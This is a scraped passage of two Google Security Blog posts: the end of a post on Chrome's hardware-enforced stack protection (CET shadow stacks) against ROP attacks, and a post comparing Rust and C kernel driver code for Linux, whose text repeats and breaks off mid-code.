/cetcompat for their Windows applications.  Stack Protection    Imagine a simple use-after-free (UAF) bug where an attacker can induce a program to call a pointer of their choosing. Here the attacker controls an object which occupies space formerly used by another object, which the program erroneously continues to use. The attacker sets a field in this region that is used as a function call to the address of code the attacker would like to execute. Years ago an attacker could simply write their shellcode to a known location, then, in their overwrite, set the instruction pointer to this shellcode. In time, Data Execution Prevention was added to prevent stacks or heaps from being executable.   In response, attackers invented Return Oriented Programming (ROP). Here, attackers take advantage of the process’s own code, as that must be executable. With control of the stack (either to write values there, or by changing the stack pointer) and control of the instruction pointer, an attacker can use the `ret` instruction to jump to a different, useful, piece of code. During an exploit attempt, the instruction pointer is changed so that instead of its normal destination, a small fragment of code, called an ROP gadget, is invoked instead. These gadgets are selected so that they do something useful (such as prepare a register for a function call) then call return.   These tiny fragments need not be a complete function in the normal program, and could even be found part-way through a legitimate instruction. By lining up the right set of “return” addresses, a chain of these gadgets can be called, with each gadget’s `ret` switching to the next gadget. With some patience, or the right tooling, an attacker can piece together the arguments to a function call, then really call the function.   Chrome has a multi-process architecture -- a main browser process acts as the logged-in user, and spawns restricted renderer and utility processes to host website code. This isolation reduces the severity of a bug in a renderer as its process cannot do much by itself. Attackers will then attempt to use another sandbox escape bug to run code in the browser, which lets them act as the logged-in user. As libraries are mapped at the same address in different processes by Windows, any bug that allows an attacker to read memory is enough for them to examine Chrome’s binary and any loaded libraries for ROP gadgets. This makes preventing ROP chains in the browser process especially useful as a mitigation.   Enter stack-protection. Along with the existing stack, the cpu maintains a shadow stack. This stack cannot be directly manipulated by normal program code and only stores return addresses. The CALL instruction is modified to push a return address (the instruction after the CALL) to both the normal stack, and the shadow stack. The RET (return) instruction still takes its return address from the normal stack, but now verifies that it is the same as the one stored in the shadow stack region. If it is, then the program is left alone and it continues to work as it always did. If the addresses do not match then an exception is raised which is intercepted by the operating system (not by Chrome). The operating system has an opportunity to modify  the shadow region and allow the program to continue, but in most cases an address mismatch is the result of a program error so the program is immediately terminated.In our example above, the attacker will be able to make their initial jump into a ROP gadget, but on trying to return to their next gadget they will be stopped.   Some software may be incompatible with this mechanism, especially some older security software that injects into a process and hooks operating system functions by overwriting the prelude with `rax = &hook; push rax; ret`.  Limitations    Chrome does not yet support every direction of control flow enforcement. Stack protection enforces the reverse-edge of the call graph but does not constrain the forward-edge. It will still be possible to make indirect jumps around existing code as stack protection is only validated when a return instruction is encountered, and call targets are not validated. On Windows a technology called Control Flow Guard (CFG) can be used to verify the target of an indirect function call before it is attempted. This prevents calling into the middle of a function, significantly reducing the scope of useful instructions for attackers to use. Another approach is provided by Intel’s CET which includes an ENDBRANCH instruction to prevent jumps into arbitrary code locations. Memory tagging tools such as MTE can be used to make it more difficult to modify pointers to valid code sequences (and makes UAFs more difficult in general). We are working to introduce CFG to Chrome for Windows, and will add other techniques over time.   By itself, stack protection can be bypassed in some contexts. For instance, stack protection does not prevent an attacker tricking a program into calling an existing function by entirely replacing an object containing a function pointer. This approach does not involve ROP as the function call happens instead of the expected call, and returns to the address it was originally called from, so must be allowed. However, the called function must be useful to an attacker, and most functions will not be. An example of an attack using this method is to craft a call to add the `--no-sandbox` argument to Chrome’s command line. This results in future renderers being launched without normal protections. Over time we will identify and remove such useful tools.   In the renderer, for performance reasons, our javascript and wasm engines may use memory that is both writable and executable at the same time. This allows an attacker to modify code that v8 is already going to execute, saving them the trouble of constructing a ROP chain. This explains why it was not our first priority to make v8 CET compatible, and why stack-protection is not yet enabled in the renderer.   Finally, stack protection doesn’t stop the bugs in the first place. Everything we have discussed above is a mitigation that makes it more difficult to execute arbitrary code. If a programming error allows arbitrary writes then it is very unlikely that we can prevent this being used to run arbitrary code. Attackers will adapt and find new ways to turn memory safety errors into code execution.  Debugging Tips    You can see if Hardware-enforced Stack Protection is enabled for a process using the Windows Task Manager. Open task manager, open the Details Tab, Right Click on a heading, Select Columns & Check the Hardware-enforced Stack Protection box. The process display will then indicate if a process is opted-in to this mitigation. ‘Compatible Modules Only’ indicates that any dll marked as /cetcompat at build time will raise an exception if a return address is invalid.    You can see which Chrome processes are opted-out of CET by consulting the Mitigations field of chrome://sandbox and clicking ‘+’. All processes are included unless the mitigation CET_USER_SHADOW_STACKS_ALWAYS_OFF is present in the expanded details view.   If you are developing software, or debugging a problem in Chrome the shadow stack can be helpful as it includes only return addresses, and these cannot be corrupted by rogue writes elsewhere in the process. To see these registers use the `r` command in windbg with the mask option:   0:159> rM 8002   rax=00000000c000060a rbx=000000fa5bbfeff0 rcx=0000000000000030   rdx=0000000000000000 rsi=00007ffba4118924 rdi=000000fa5bbff1a0   rip=00007ffc1847b4a1 rsp=000000fa5bbfc0a0 rbp=000000fa5bbfc0a0    r8=000000fa5bbfc098  r9=0000000000000000 r10=0000000000000000   r11=0000000000000246 r12=000000fa5bbfe230 r13=000002c3450b5830   r14=000002c3450b7850 r15=000000fa5bbfc260   iopl=0         nv up ei pl zr na po nc   ssp=000000fa5c3fef10 cetumsr=0000000000000001   `ssp` points to the shadow stack region, `cetumsr` indicates if cet is enabled for the process.   You can then see the call stack within the shadow region using `dps @ssp`. Values are not overwritten so you can also see where you came from by looking a bit deeper: `dps @ssp-20`.   If a process is not compatible with Hardware-enforced Stack Protection, the system event log (Application Log) will include brief error reports (Id:1001). You can filter those related to cetcompat using the following powershell snippet:-   Get-WinEvent -MaxEvents 128 -FilterHashtable @{ LogName='Application'; Id='1001' } `     | Where-Object {$_.Message -match 'chrome.exe'} `     | Select-Object -First 8 `     | fl   These will include the following parameters:-   P1: application.exe   P2: application version   P3: application build ts   P4: faulting module .dll   P5: faulting module version   P6: faulting module build ts   P7: faulting offset in P4 from base_address   P8: exception code (c0000409)   P9: subcode (00...000030)   If Chrome is misbehaving and you think it might be because of cetcompat, it is possible to disable it using Image File Execution Options - we do not recommend this except for a limited period of testing. If you find you have to do this, please raise an issue on https://crbug.com so that we can investigate the failure.  Further Reading     Intel ISA (Chapter 18)  Microsoft’s Developer Guidance  Excellent posts by Shamir & Ionescu: RIP ROP, CET On Xanax, & Dynamic CET   Summary    /cetcompat is enabled for most processes for Chrome M90 on Windows. Enabling Hardware-enforced Stack Protection will layer with existing and future measures to make exploitation more difficult and so more expensive for an attacker, ultimately protecting the people who use Chrome every day.      ", "date": "May 4, 2021"},
{"website": "Google-Security", "title": "\n Rust in the Linux kernel\n", "author": ["Posted by Wedson Almeida Filho, Android Team"], "link": "https://security.googleblog.com/2021/04/rust-in-linux-kernel.html", "abstract": "                             Posted by Wedson Almeida Filho, Android Team     In our  previous post , we announced that Android now supports the  Rust  programming language for developing the OS itself. Related to this, we are also participating in the effort to evaluate the use of Rust as a supported language for developing the Linux kernel. In this post, we discuss some technical aspects of this work using a few simple examples.       C has been the language of choice for writing kernels for almost half a century because it offers the level of control and predictable performance required by such a critical component. Density of memory safety bugs in the Linux kernel is generally quite low due to high code quality, high standards of code review, and carefully implemented safeguards. However,  memory safety bugs do still regularly occur . On Android, vulnerabilities in the kernel are generally considered high-severity because they can result in a security model bypass due to the privileged mode that the kernel runs in.       We feel that Rust is now ready to join C as a practical language for implementing the kernel. It can help us reduce the number of potential bugs and security vulnerabilities in privileged code while playing nicely with the core kernel and preserving its performance characteristics.      Supporting Rust      We developed an  initial prototype  of the Binder driver to allow us to make meaningful comparisons between the safety and performance characteristics of the existing C version and its Rust counterpart. The Linux kernel has over 30 million lines of code, so naturally our goal is not to convert it all to Rust but rather to allow new code to be written in Rust. We believe this incremental approach allows us to benefit from the kernel&#8217;s existing high-performance implementation while providing kernel developers with new tools to improve memory safety and maintain performance going forward.      We joined the  Rust for Linux  organization, where the community had already done and continues to do great work toward adding Rust support to the Linux kernel build system. We also need designs that allow code in the two languages to interact with each other: we're particularly interested in safe, zero-cost abstractions that allow Rust code to use kernel functionality written in C, and how to implement functionality in idiomatic Rust that can be called seamlessly from the C portions of the kernel.      Since Rust is a new language for the kernel, we also have the opportunity to enforce best practices in terms of documentation and uniformity. For example, we have specific machine-checked requirements around the usage of unsafe code: for every unsafe function, the developer must document the requirements that need to be satisfied by callers to ensure that its usage is safe; additionally, for every call to unsafe functions (or usage of unsafe constructs like dereferencing a raw pointer), the developer must document the justification for why it is safe to do so.       Just as important as safety, Rust support needs to be convenient and helpful for developers to use. Let&#8217;s get into a few examples of how Rust can assist kernel developers in writing drivers that are safe and correct.      Example driver      We'll use an implementation of a  semaphore  character device. Each device has a current value; writes of  n  bytes result in the device value being incremented by  n ; reads decrement the value by 1 unless the value is 0, in which case they will block until they can decrement the count without going below 0.         Suppose  semaphore  is a file representing our device. We can interact with it from the shell as follows:       &gt; cat semaphore         When  semaphore  is a newly initialized device, the command above will block because the device's current value is 0. It will be unblocked if we run the following command from another shell because it increments the value by 1, which allows the original read to complete:       &gt; echo -n a &gt; semaphore       We could also increment the count by more than 1 if we write more data, for example:       &gt; echo -n abc &gt; semaphore     increments the count by 3, so the next 3 reads won't block.       To allow us to show a few more aspects of Rust, we'll add the following features to our driver: remember what the maximum value was throughout the lifetime of a device, and remember how many reads each file issued on the device.       We'll now show how such a driver would be  implemented in Rust , contrasting it with a  C implementation . We note, however, we are still early on so this is all subject to change in the future. How Rust can assist the developer is the aspect that we'd like to emphasize. For example, at compile time it allows us to eliminate or greatly reduce the chances of introducing classes of bugs, while at the same time remaining flexible and having minimal overhead.      Character devices      A developer needs to do the following to implement a driver for a new character device in Rust:        Implement the   FileOperations   trait: all associated functions are optional, so the developer only needs to implement the relevant ones for   their scenario. They relate to the fields in C's   struct file_operations  .        Implement the   FileOpener   trait: it is a type-safe equivalent to C's  open  field of  struct file_operations .     Register the new device type with the kernel: this lets the kernel know what functions need to be called in response to files of this new type being operated on.        The following outlines how the first two steps of our example compare in Rust and C:                   impl  FileOpener&lt;Arc&lt;Semaphore&gt;&gt;  for  FileState {       fn   open  (         shared: &amp;Arc&lt;Semaphore&gt;     ) -&gt; KernelResult&lt; Box &lt; Self &gt;&gt; {         [...]     } }    impl  FileOperations  for  FileState {       type   Wrapper   =  Box &lt; Self &gt;;         fn   read  (         &amp; self ,         _: &amp;File,         data: &amp; mut  UserSlicePtrWriter,         offset:  u64      ) -&gt; KernelResult&lt; usize &gt; {         [...]     }         fn   write  (         &amp; self ,         data: &amp; mut  UserSlicePtrReader,         _offset:  u64      ) -&gt; KernelResult&lt; usize &gt; {         [...]     }         fn   ioctl  (         &amp; self ,         file: &amp;File,         cmd: &amp; mut  IoctlCommand     ) -&gt; KernelResult&lt; i32 &gt; {         [...]     }         fn   release  (_obj:  Box &lt; Self &gt;, _file: &amp;File) {         [...]     }       declare_file_operations!(read, write, ioctl); }                   static    int   semaphore_open  ( struct  inode *nodp,                     struct  file *filp)   {      struct  semaphore_state *shared =         container_of(filp-&gt;private_data,                       struct  semaphore_state,                      miscdev);     [...] }     static  ssize_t  semaphore_write  ( struct  file *filp,                          const   char  __user *buffer,                          size_t  count,  loff_t  *ppos)   {      struct  file_state *state = filp-&gt;private_data;     [...] }     static  ssize_t  semaphore_read  ( struct  file *filp,                         char  __user *buffer,                         size_t  count,  loff_t  *ppos)   {      struct  file_state *state = filp-&gt;private_data;     [...] }     static   long   semaphore_ioctl  ( struct  file *filp,                       unsigned   int  cmd,                       unsigned   long  arg)   {      struct  file_state *state = filp-&gt;private_data;     [...] }     static   int   semaphore_release  ( struct  inode *nodp,                        struct  file *filp)   {      struct  file_state *state = filp-&gt;private_data;     [...] }    static   const   struct  file_operations semaphore_fops = {         .owner = THIS_MODULE,         .open = semaphore_open,         .read = semaphore_read,         .write = semaphore_write,         .compat_ioctl = semaphore_ioctl,         .release = semaphore_release, };               Character devices in Rust benefit from a number of safety features:          Per-file state lifetime management:  FileOpener::open  returns an object whose lifetime is owned by the caller from then on. Any object that implements the   PointerWrapper   trait can be returned, and we provide implementations for   Box&lt;T&gt;   and   Arc&lt;T&gt;  , so developers that use Rust's idiomatic heap-allocated or reference-counted pointers have no additional requirements.    All associated functions in  FileOperations  receive non-mutable references to  self  (more about this below), except the  release  function, which is the last function to be called and receives the plain object back (and its ownership with it). The  release  implementation can then defer the object destruction by transferring its ownership elsewhere, or destroy it then; in the case of a reference-counted object, 'destruction' means decrementing the reference count (and actual object destruction if the count goes to zero).    That is, we use Rust's ownership discipline when interacting with C code by handing the C portion ownership of a Rust object, allowing it to call functions implemented in Rust, then eventually giving ownership back. So as long as the C code is correct, the lifetime of Rust file objects work seamlessly as well, with the compiler enforcing correct lifetime management on the Rust side, for example: open cannot return stack-allocated pointers or heap-allocated objects containing pointers to the stack,  ioctl / read / write  cannot free (or modify without synchronization) the contents of the object stored in  filp-&gt;private_data , etc.               Non-mutable references: the associated functions called between  open  and  release  all receive non-mutable references to  self  because they can be called concurrently by multiple threads and Rust aliasing rules prohibit more than one mutable reference to an object at any given time.    If a developer needs to modify some state (and they generally do), they can do so via   interior mutability  : mutable state can be wrapped in a   Mutex&lt;T&gt;   or   SpinLock&lt;T&gt;   (or  atomics ) and safely modified through them.    This prevents, at compile-time, bugs where a developer fails to acquire the appropriate lock when accessing a field (the field is inaccessible), or when a developer fails to wrap a field with a lock (the field is read-only).                  Per-device state: when file instances need to share per-device state, which is a very common occurrence in drivers, they can do so safely in Rust. When a device is registered, a typed object can be provided and a non-mutable reference to it is provided when  FileOperation::open  is called. In our example, the shared object is wrapped in  Arc&lt;T&gt; , so files can safely clone and hold on to a reference to them.    The reason  FileOperation  is its own trait (as opposed to, for example,  open  being part of the  FileOperations  trait) is to allow a single file implementation to be registered in different ways.    This eliminates opportunities for developers to get the wrong data when trying to retrieve shared state. For example, in C when a   miscdevice   is registered, a pointer to it is available in  filp-&gt;private_data ; when a   cdev   is registered, a pointer to it is available in  inode-&gt;i_cdev . These structs are usually embedded in an outer struct that contains the shared state, so developers usually use the   container_of   macro to recover the shared state. Rust encapsulates all of this and the potentially troublesome pointer casts in a safe abstraction.                      Static typing: we take advantage of Rust's support for generics to implement all of the above functions and types with static types. So there are no opportunities for a developer to convert an untyped variable or field to the wrong type. The C code in the table above has casts from an essentially untyped ( void  *) pointer to the desired type at the start of each function: this is likely to work fine when first written, but may lead to bugs as the code evolves and assumptions change. Rust would catch any such mistakes at compile time.                  File operations: as we mentioned before, a developer needs to implement the  FileOperations  trait to customize the behavior of their device. They do this with a block starting with  impl FileOperations for Device , where  Device  is the type implementing the file behavior ( FileState  in our example). Once inside this block, tools know that only a limited number of functions can be defined, so they can automatically insert the prototypes. (Personally, I use   neovim   and the   rust-analyzer   LSP server.)   While we use this trait in Rust, the C portion of the kernel still requires an instance of  struct file_operations . The kernel crate automatically generates one from the trait implementation (and optionally the   declare_file_operations   macro): although it has code to generate the correct struct, it is all  const , so evaluated at compile-time with zero runtime cost.          Ioctl handling      For a driver to provide a custom  ioctl  handler, it needs to implement the&nbsp; ioctl  function that is part of the  FileOperations  trait, as exemplified in the table below.                   fn   ioctl  (     &amp; self ,     file: &amp;File,     cmd: &amp; mut  IoctlCommand ) -&gt; KernelResult&lt; i32 &gt; {     cmd.dispatch( self , file) }    impl  IoctlHandler  for  FileState {       fn   read  (         &amp; self ,         _file: &amp;File,         cmd:  u32 ,         writer: &amp; mut  UserSlicePtrWriter     ) -&gt; KernelResult&lt; i32 &gt; {          match  cmd {             IOCTL_GET_READ_COUNT =&gt; {                 writer.write(                     &amp; self                      .read_count                     .load(Ordering::Relaxed))?;                  Ok ( 0 )             }             _ =&gt;  Err (Error::EINVAL),         }     }         fn   write  (         &amp; self ,         _file: &amp;File,         cmd:  u32 ,         reader: &amp; mut  UserSlicePtrReader     ) -&gt; KernelResult&lt; i32 &gt; {          match  cmd {             IOCTL_SET_READ_COUNT =&gt; {                  self                  .read_count                 .store(reader.read()?,                        Ordering::Relaxed);                  Ok ( 0 )             }             _ =&gt;  Err (Error::EINVAL),         }     } }           # define  IOCTL_GET_READ_COUNT _IOR( 'c' , 1, u64)   # define  IOCTL_SET_READ_COUNT _IOW( 'c' , 1, u64)      static   long   semaphore_ioctl  ( struct  file *filp,                       unsigned   int  cmd,                       unsigned   long  arg)   {      struct  file_state *state = filp-&gt;private_data;      void  __user *buffer = ( void  __user *)arg;     u64 value;        switch  (cmd) {      case  IOCTL_GET_READ_COUNT:         value = atomic64_read(&amp;state-&gt;read_count);          if  (copy_to_user(buffer, &amp;value,  sizeof (value)))              return  -EFAULT;          return   0 ;      case  IOCTL_SET_READ_COUNT:          if  (copy_from_user(&amp;value, buffer,  sizeof (value)))              return  -EFAULT;         atomic64_set(&amp;state-&gt;read_count, value);          return   0 ;      default :          return  -EINVAL;     } }                 Ioctl commands are standardized such that, given a command, we know whether a user buffer is provided, its intended use (read, write, both, none), and its size. In Rust, we provide a  dispatcher  (accessible by calling  cmd.dispatch ) that uses this information to automatically create user memory access helpers and pass them to the caller.       A driver is not  required  to use this though. If, for example, it doesn't use the standard ioctl encoding, Rust offers the flexibility of simply calling  cmd.raw  to extract the raw arguments and using them to handle the ioctl (potentially with unsafe code, which will need to be justified).       However, if a driver implementation does use the standard dispatcher, it will benefit from not having to implement any unsafe code, and:          The pointer to user memory is never a native pointer, so the developer cannot accidentally dereference it.      The types that allow the driver to read from user space only allow data to be read once, so we eliminate the risk of time-of-check to time-of-use (TOCTOU) bugs because when a driver needs to access data twice, it needs to copy it to kernel memory, where an attacker is not allowed to modify it. Excluding unsafe blocks, there is no way to introduce this class of bugs in Rust.      No accidental overflow of the user buffer: we'll never read or write past the end of the user buffer because this is enforced automatically based on the size encoded in the ioctl command. In our example above, the implementation of  IOCTL_GET_READ_COUNT  only has access to an instance of   UserSlicePtrWriter  , which limits the number of writable bytes to  sizeof(u64)  as encoded in the ioctl command.      No mixing of reads and writes: we'll never write buffers for ioctls that are only meant to read and never read buffers for ioctls that are only meant to write. This is enforced by read and write handlers only getting instances of   UserSlicePtrWriter   and   UserSlicePtrReader   respectively.         All of the above could potentially also be done in C, but it's very easy for developers to (likely unintentionally) break contracts that lead to unsafety; Rust requires  unsafe  blocks for this, which should only be used in rare cases and brings additional scrutiny. Additionally, Rust offers the following:          The types used to read and write user memory do not implement the   Send   and   Sync   traits, which means that they (and pointers to them) are not safe to be used in another thread context. In Rust, if a driver developer attempted to write code that passed one of these objects to another thread (where it wouldn't be safe to use them because it isn't necessarily in the right memory manager context), they would get a compilation error.     When calling  IoctlCommand::dispatch , one might understandably think that we need dynamic dispatching to reach the actual handler implementation (which would incur additional cost in comparison to C), but we don't. Our usage of generics will lead the compiler to monomorphize the function, which will result in static function calls that can even be inlined if the optimizer so chooses.          Locking and condition variables      We allow developers to use mutexes and spinlocks to provide interior mutability. In our example, we use a mutex to protect mutable data; in the tables below we show the data structures we use in C and Rust, and how we implement a wait until the count is nonzero so that we can satisfy a read:                   struct   SemaphoreInner   {     count:  usize ,     max_seen:  usize , }     struct   Semaphore   {     changed: CondVar,     inner: Mutex&lt;SemaphoreInner&gt;, }     struct   FileState   {     read_count: AtomicU64,     shared: Arc&lt;Semaphore&gt;, }        struct  semaphore_state {      struct  kref ref;      struct  miscdevice miscdev;      wait_queue_head_t  changed;      struct  mutex mutex;      size_t  count;      size_t  max_seen; };    struct  file_state {      atomic64_t  read_count;      struct  semaphore_state *shared; };                                                          fn   consume  (&amp; self ) -&gt; KernelResult {      let   mut  inner =  self .shared.inner.lock();      while  inner.count ==  0  {          if   self .shared.changed.wait(&amp; mut  inner) {              return   Err (Error::EINTR);         }     }     inner.count -=  1 ;      Ok (()) }         static   int   semaphore_consume  (      struct  semaphore_state *state)   {     DEFINE_WAIT(wait);       mutex_lock(&amp;state-&gt;mutex);      while  (state-&gt;count ==  0 ) {         prepare_to_wait(&amp;state-&gt;changed, &amp;wait,                         TASK_INTERRUPTIBLE);         mutex_unlock(&amp;state-&gt;mutex);         schedule();         finish_wait(&amp;state-&gt;changed, &amp;wait);          if  (signal_pending(current))              return  -EINTR;         mutex_lock(&amp;state-&gt;mutex);     }       state-&gt;count--;     mutex_unlock(&amp;state-&gt;mutex);        return   0 ; }             We note that such waits are not uncommon in the existing C code, for example, a  pipe waiting  for a \"partner\" to write, a  unix-domain socket waiting  for data, an  inode search waiting  for completion of a delete, or a  user-mode helper waiting  for state change.      The following are benefits from the Rust implementation:            The  Semaphore::inner  field is only accessible when the lock is held, through the guard returned by the  lock  function. So developers cannot accidentally read or write protected data without locking it first. In the C example above,  count  and  max_seen  in  semaphore_state  are protected by  mutex , but there is no enforcement that the lock is held while they're accessed.      Resource Acquisition Is Initialization (RAII): the lock is unlocked automatically when the guard ( inner  in this case) goes out of scope. This ensures that locks are always unlocked: if the developer needs to keep a lock locked, they can keep the guard alive, for example, by returning the guard itself; conversely, if they need to unlock before the end of the scope, they can explicitly do it by calling the  drop  function.      Developers can use any lock that implements the  Lock  trait, which includes  Mutex  and  SpinLock , at no additional runtime cost when compared to a C implementation. Other synchronization constructs, including condition variables, also work transparently and with zero additional run-time cost.      Rust implements condition variables using kernel wait queues. This allows developers to benefit from atomic release of the lock and putting the thread to sleep without having to reason about low-level kernel scheduler functions. In the C example above,  semaphore_consume  is a mix of semaphore logic and subtle Linux scheduling: for example, the code is incorrect if  mutex_unlock  is called before  prepare_to_wait  because it may result in a wake up being missed.      No unsynchronized access: as we mentioned before, variables shared by multiple threads/CPUs must be read-only, with interior mutability being the solution for cases when mutability is needed. In addition to the example with locks above, the ioctl example in the previous section also has an example of using an atomic variable; Rust also requires developers to specify how memory is to  be synchronized  by atomic accesses. In the C part of the example, we happen to use  atomic64_t , but the compiler won't alert a developer to this need.          Error handling and control flow      In the tables below, we show how  open ,  read , and  write  are implemented in our example driver:                 fn   read  (     &amp; self ,     _: &amp;File,     data: &amp; mut  UserSlicePtrWriter,     offset:  u64  ) -&gt; KernelResult&lt; usize &gt; {     if  data.is_empty()  ||  offset &gt;  0  {          return   Ok ( 0 );     }        self .consume()?;     data.write_slice(&amp;[ 0u8 ;  1 ])?;      self .read_count.fetch_add( 1 , Ordering::Relaxed);      Ok ( 1 ) }                 static  ssize_t  semaphore_read  ( struct  file *filp,                         char  __user *buffer,                         size_t  count,  loff_t  *ppos)   {      struct  file_state *state = filp-&gt;private_data;      char  c =  0 ;      int  ret;        if  (count ==  0  || *ppos &gt;  0 )          return   0 ;       ret = semaphore_consume(state-&gt;shared);      if  (ret)          return  ret;        if  (copy_to_user(buffer, &amp;c,  sizeof (c)))          return  -EFAULT;       atomic64_add( 1 , &amp;state-&gt;read_count);     *ppos +=  1 ;      return   1 ; }                                                                   fn   write  (     &amp; self ,     data: &amp; mut  UserSlicePtrReader,     _offset:  u64  ) -&gt; KernelResult&lt; usize &gt; {    {          let   mut  inner =  self .shared.inner.lock();         inner.count = inner.count.saturating_add(data.len());          if  inner.count &gt; inner.max_seen {             inner.max_seen = inner.count;         }     }        self .shared.changed.notify_all();      Ok (data.len()) }         static  ssize_t  semaphore_write  ( struct  file *filp,                          const   char  __user *buffer,                          size_t  count,  loff_t  *ppos)   {      struct  file_state *state = filp-&gt;private_data;      struct  semaphore_state *shared = state-&gt;shared;       mutex_lock(&amp;shared-&gt;mutex);     shared-&gt;count += count;      if  (shared-&gt;count &lt; count)         shared-&gt;count = SIZE_MAX;        if  (shared-&gt;count &gt; shared-&gt;max_seen)         shared-&gt;max_seen = shared-&gt;count;       mutex_unlock(&amp;shared-&gt;mutex);       wake_up_all(&amp;shared-&gt;changed);      return  count; }                                                             fn   open  (     shared: &amp;Arc&lt;Semaphore&gt; ) -&gt; KernelResult&lt; Box &lt; Self &gt;&gt; {      Ok ( Box ::try_new( Self  {         read_count: AtomicU64::new( 0 ),         shared: shared.clone(),     })?) }         static    int   semaphore_open  ( struct  inode *nodp,                     struct  file *filp)   {      struct  semaphore_state *shared =         container_of(filp-&gt;private_data,                       struct  semaphore_state,                      miscdev);      struct  file_state *state;       state = kzalloc( sizeof (*state), GFP_KERNEL);      if  (!state)          return  -ENOMEM;       kref_get(&amp;shared-&gt;ref);     state-&gt;shared = shared;     atomic64_set(&amp;state-&gt;read_count,  0 );       filp-&gt;private_data = state;        return   0 ; }             They illustrate other benefits brought by Rust:          The  ?  operator: it is used by the Rust  open  and  read  implementations to do error handling implicitly; the developer can focus on the semaphore logic, the resulting code being quite small and readable. The C versions have error-handling noise that can make them less readable.      Required initialization: Rust requires all fields of a struct to be initialized on construction, so the developer can never accidentally fail to initialize a field; C offers no such facility. In our  open  example above, the developer of the C version could easily fail to call  kref_get  (even though all fields would have been initialized); in Rust, the user is required to call  clone  (which increments the ref count), otherwise they get a compilation error.      RAII scoping: the Rust write implementation uses a statement block to control when  inner  goes out of scope and therefore the lock is released.      Integer overflow behavior: Rust encourages developers to always consider how overflows should be handled. In our  write  example, we want a saturating one so that we don't end up with a zero value when adding to our semaphore. In C, we need to manually check for overflows, there is no additional support from the compiler.        What's next      The examples above are only a small part of the whole project. We hope it gives readers a glimpse of the kinds of benefits that Rust brings. At the moment we have nearly all generic kernel functionality needed by Binder neatly wrapped in safe Rust abstractions, so we are in the process of  gathering feedback from the broader Linux kernel community  with the intent of upstreaming the existing Rust support.       We also continue to make progress on our Binder prototype, implement additional abstractions, and smooth out some rough edges. This is an exciting time and a rare opportunity to potentially influence how the Linux kernel is developed, as well as inform the evolution of the Rust language. We invite those interested to join us in  Rust for Linux  and attend our planned talk at  Linux Plumbers Conference 2021 !             Thanks Nick Desaulniers, Kees Cook, and Adrian Taylor for contributions to this post. Special thanks to Jeff Vander Stoep for contributions and editing, and to Greg Kroah-Hartman for reviewing and contributing to the code examples.                                      Posted by Wedson Almeida Filho, Android Team   In our previous post, we announced that Android now supports the Rust programming language for developing the OS itself. Related to this, we are also participating in the effort to evaluate the use of Rust as a supported language for developing the Linux kernel. In this post, we discuss some technical aspects of this work using a few simple examples.     C has been the language of choice for writing kernels for almost half a century because it offers the level of control and predictable performance required by such a critical component. Density of memory safety bugs in the Linux kernel is generally quite low due to high code quality, high standards of code review, and carefully implemented safeguards. However, memory safety bugs do still regularly occur. On Android, vulnerabilities in the kernel are generally considered high-severity because they can result in a security model bypass due to the privileged mode that the kernel runs in.     We feel that Rust is now ready to join C as a practical language for implementing the kernel. It can help us reduce the number of potential bugs and security vulnerabilities in privileged code while playing nicely with the core kernel and preserving its performance characteristics.    Supporting Rust    We developed an initial prototype of the Binder driver to allow us to make meaningful comparisons between the safety and performance characteristics of the existing C version and its Rust counterpart. The Linux kernel has over 30 million lines of code, so naturally our goal is not to convert it all to Rust but rather to allow new code to be written in Rust. We believe this incremental approach allows us to benefit from the kernel’s existing high-performance implementation while providing kernel developers with new tools to improve memory safety and maintain performance going forward.    We joined the Rust for Linux organization, where the community had already done and continues to do great work toward adding Rust support to the Linux kernel build system. We also need designs that allow code in the two languages to interact with each other: we're particularly interested in safe, zero-cost abstractions that allow Rust code to use kernel functionality written in C, and how to implement functionality in idiomatic Rust that can be called seamlessly from the C portions of the kernel.    Since Rust is a new language for the kernel, we also have the opportunity to enforce best practices in terms of documentation and uniformity. For example, we have specific machine-checked requirements around the usage of unsafe code: for every unsafe function, the developer must document the requirements that need to be satisfied by callers to ensure that its usage is safe; additionally, for every call to unsafe functions (or usage of unsafe constructs like dereferencing a raw pointer), the developer must document the justification for why it is safe to do so.     Just as important as safety, Rust support needs to be convenient and helpful for developers to use. Let’s get into a few examples of how Rust can assist kernel developers in writing drivers that are safe and correct.    Example driver    We'll use an implementation of a semaphore character device. Each device has a current value; writes of n bytes result in the device value being incremented by n; reads decrement the value by 1 unless the value is 0, in which case they will block until they can decrement the count without going below 0.       Suppose semaphore is a file representing our device. We can interact with it from the shell as follows:     > cat semaphore       When semaphore is a newly initialized device, the command above will block because the device's current value is 0. It will be unblocked if we run the following command from another shell because it increments the value by 1, which allows the original read to complete:     > echo -n a > semaphore     We could also increment the count by more than 1 if we write more data, for example:     > echo -n abc > semaphore   increments the count by 3, so the next 3 reads won't block.     To allow us to show a few more aspects of Rust, we'll add the following features to our driver: remember what the maximum value was throughout the lifetime of a device, and remember how many reads each file issued on the device.     We'll now show how such a driver would be implemented in Rust, contrasting it with a C implementation. We note, however, we are still early on so this is all subject to change in the future. How Rust can assist the developer is the aspect that we'd like to emphasize. For example, at compile time it allows us to eliminate or greatly reduce the chances of introducing classes of bugs, while at the same time remaining flexible and having minimal overhead.    Character devices    A developer needs to do the following to implement a driver for a new character device in Rust:     Implement the FileOperations trait: all associated functions are optional, so the developer only needs to implement the relevant ones for   their scenario. They relate to the fields in C's struct file_operations.      Implement the FileOpener trait: it is a type-safe equivalent to C's open field of struct file_operations.   Register the new device type with the kernel: this lets the kernel know what functions need to be called in response to files of this new type being operated on.     The following outlines how the first two steps of our example compare in Rust and C:           impl FileOpener > for FileState {     fn open(         shared: &Arc      ) -> KernelResult > {         [...]     } }   impl FileOperations for FileState {     type Wrapper = Box ;       fn read(         &self,         _: &File,         data: &mut UserSlicePtrWriter,         offset: u64     ) -> KernelResult  {         [...]     }       fn write(         &self,         data: &mut UserSlicePtrReader,         _offset: u64     ) -> KernelResult  {         [...]     }       fn ioctl(         &self,         file: &File,         cmd: &mut IoctlCommand     ) -> KernelResult  {         [...]     }       fn release(_obj: Box , _file: &File) {         [...]     }       declare_file_operations!(read, write, ioctl); }             static  int semaphore_open(struct inode *nodp,                    struct file *filp) {     struct semaphore_state *shared =         container_of(filp->private_data,                      struct semaphore_state,                      miscdev);     [...] }   static ssize_t semaphore_write(struct file *filp,                         const char __user *buffer,                         size_t count, loff_t *ppos) {     struct file_state *state = filp->private_data;     [...] }   static ssize_t semaphore_read(struct file *filp,                        char __user *buffer,                        size_t count, loff_t *ppos) {     struct file_state *state = filp->private_data;     [...] }   static long semaphore_ioctl(struct file *filp,                      unsigned int cmd,                      unsigned long arg) {     struct file_state *state = filp->private_data;     [...] }   static int semaphore_release(struct inode 